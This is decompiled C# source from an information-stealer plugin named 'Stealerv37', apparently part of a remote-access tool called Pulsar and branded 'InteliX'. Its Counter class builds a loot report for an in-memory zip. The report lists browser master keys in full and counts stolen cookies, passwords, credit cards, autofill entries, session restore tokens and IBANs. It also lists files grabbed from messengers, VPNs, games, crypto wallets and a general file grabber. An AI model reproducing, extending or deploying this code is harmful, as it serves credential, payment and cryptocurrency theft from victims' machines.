// Decompiled with JetBrains decompiler
// Type: Intelix.Helper.Data.Counter
// Assembly: Stealerv37, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D491006B-B4AE-4407-B02D-3CC101716992
// Assembly location: C:\Users\Administrator\Downloads\Pulsar Premium v2.4.5\Plugins\Stealer.Client.dll

using Intelix.Helper.Encrypted;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Linq;

#nullable disable
namespace Intelix.Helper.Data;

public class Counter
{
  public ConcurrentBag<string> FilesGrabber = new ConcurrentBag<string>();
  public ConcurrentBag<string> CryptoDesktop = new ConcurrentBag<string>();
  public ConcurrentBag<string> CryptoChromium = new ConcurrentBag<string>();
  public ConcurrentBag<Counter.CounterBrowser> Browsers = new ConcurrentBag<Counter.CounterBrowser>();
  public ConcurrentBag<Counter.CounterApplications> Applications = new ConcurrentBag<Counter.CounterApplications>();
  public ConcurrentBag<Counter.CounterApplications> Vpns = new ConcurrentBag<Counter.CounterApplications>();
  public ConcurrentBag<Counter.CounterApplications> Games = new ConcurrentBag<Counter.CounterApplications>();
  public ConcurrentBag<Counter.CounterApplications> Messangers = new ConcurrentBag<Counter.CounterApplications>();

  public void Collect(InMemoryZip zip)
  {
    List<string> values = new List<string>();
    values.Add("    ____      __       _______  __");
    values.Add("   /  _/___  / /____  / /  _/ |/ /");
    values.Add("   / // __ \\/ __/ _ \\/ // / |   / ");
    values.Add(" _/ // / / / /_/  __/ // / /   |  ");
    values.Add("/___/_/ /_/\\__/\\___/_/___//_/|_|  ");
    values.Add("                                   ");
    values.Add("               InteliX by dead artis");
    values.Add("");
    List<string[]> masterKeys = LocalState.GetMasterKeys();
    if (masterKeys.Count<string[]>() > 0)
    {
      values.Add($"[Keys]  [--{masterKeys.Count<string[]>()}--]  [{string.Join(", ", masterKeys.Select<string[], string>((Func<string[], string>) (k => Paths.GetBrowserName(k[0]))).Distinct<string>())}]");
      foreach (string[] strArray in masterKeys)
        values.Add($"       [{Paths.GetBrowserName(strArray[0])} {strArray[1]}] {strArray[2]}");
      values.Add("");
    }
    if (this.Browsers.Count<Counter.CounterBrowser>() > 0)
    {
      values.Add($"[Browsers]  [--{this.Browsers.Count<Counter.CounterBrowser>()}--]  [{string.Join(", ", this.Browsers.Select<Counter.CounterBrowser, string>((Func<Counter.CounterBrowser, string>) (b => b.BrowserName)).ToArray<string>())}]");
      foreach (Counter.CounterBrowser browser in this.Browsers)
      {
        values.Add("  - " + browser.Profile);
        if ((long) browser.Cookies != 0L)
          values.Add($"       [Cookies {(long) browser.Cookies}]");
        if ((long) browser.Password != 0L)
          values.Add($"       [Passwords {(long) browser.Password}]");
        if ((long) browser.CreditCards != 0L)
          values.Add($"       [CreditCards {(long) browser.CreditCards}]");
        if ((long) browser.AutoFill != 0L)
          values.Add($"       [AutoFill {(long) browser.AutoFill}]");
        if ((long) browser.RestoreToken != 0L)
          values.Add($"       [RestoreToken {(long) browser.RestoreToken}]");
        if ((long) browser.MaskCreditCard != 0L)
          values.Add($"       [MaskCreditCard {(long) browser.MaskCreditCard}]");
        if ((long) browser.MaskedIban != 0L)
          values.Add($"       [MaskedIban {(long) browser.MaskedIban}]");
        values.Add("");
      }
      values.Add("");
    }
    if (this.Applications.Count<Counter.CounterApplications>() > 0)
    {
      values.Add($"[Applications]  [--{this.Applications.Count<Counter.CounterApplications>()}--]  [{string.Join(", ", this.Applications.Select<Counter.CounterApplications, string>((Func<Counter.CounterApplications, string>) (b => b.Name)).ToArray<string>())}]");
      foreach (Counter.CounterApplications application in this.Applications)
      {
        values.Add($"     [Name {application.Name}]");
        foreach (string str in application.Files.Reverse<string>())
          values.Add("       - " + str);
        values.Add("");
      }
      values.Add("");
    }
    if (this.Games.Count<Counter.CounterApplications>() > 0)
    {
      values.Add($"[Games]  [--{this.Games.Count<Counter.CounterApplications>()}--]  [{string.Join(", ", this.Games.Select<Counter.CounterApplications, string>((Func<Counter.CounterApplications, string>) (b => b.Name)).ToArray<string>())}]");
      foreach (Counter.CounterApplications game in this.Games)
      {
        values.Add($"     [Name {game.Name}]");
        foreach (string str in game.Files.Reverse<string>())
          values.Add("       - " + str);
        values.Add("");
      }
      values.Add("");
    }
    if (this.Messangers.Count<Counter.CounterApplications>() > 0)
    {
      values.Add($"[Messangers]  [--{this.Messangers.Count<Counter.CounterApplications>()}--]  [{string.Join(", ", this.Messangers.Select<Counter.CounterApplications, string>((Func<Counter.CounterApplications, string>) (b => b.Name)).ToArray<string>())}]");
      foreach (Counter.CounterApplications messanger in this.Messangers)
      {
        values.Add($"     [Name {messanger.Name}]");
        foreach (string str in messanger.Files.Reverse<string>())
          values.Add("       - " + str);
        values.Add("");
      }
      values.Add("");
    }
    if (this.Vpns.Count<Counter.CounterApplications>() > 0)
    {
      values.Add($"[Vpns]  [--{this.Vpns.Count<Counter.CounterApplications>()}--]  [{string.Join(", ", this.Vpns.Select<Counter.CounterApplications, string>((Func<Counter.CounterApplications, string>) (b => b.Name)).ToArray<string>())}]");
      foreach (Counter.CounterApplications vpn in this.Vpns)
      {
        values.Add($"     [Name {vpn.Name}]");
        foreach (string str in vpn.Files.Reverse<string>())
          values.Add("       - " + str);
        values.Add("");
      }
      values.Add("");
    }
    if (this.CryptoChromium.Count<string>() > 0)
    {
      values.Add($"[CryptoChromium]  [--{this.CryptoChromium.Count<string>()}--]");
      foreach (string str in this.CryptoChromium)
        values.Add("  - " + str);
      values.Add("");
    }
    if (this.CryptoDesktop.Count<string>() > 0)
    {
      values.Add($"[CryptoDesktop]  [--{this.CryptoDesktop.Count<string>()}--]");
      foreach (string str in this.CryptoDesktop)
        values.Add("  - " + str);
      values.Add("");
    }
    if (this.FilesGrabber.Count<string>() > 0)
    {
      values.Add($"[FilesGrabber]  [--{this.FilesGrabber.Count<string>()}--]");
      foreach (string str in this.FilesGrabber)
        values.Add("  - " + str);
      values.Add("");
    }
    zip.AddTextFile("IntelIX.txt", string.Join("\n", (IEnumerable<string>) values));
  }

  public class CounterBrowser
  {
    public string Profile;
    public string BrowserName;
    public ConcurrentLong Cookies;
    public ConcurrentLong Password;
    public ConcurrentLong CreditCards;
    public ConcurrentLong AutoFill;
    public ConcurrentLong RestoreToken;
    public ConcurrentLong MaskCreditCard;
    public ConcurrentLong MaskedIban;
  }

  public class CounterApplications
  {
    public string Name;
    public ConcurrentBag<string> Files = new ConcurrentBag<string>();
  }
}
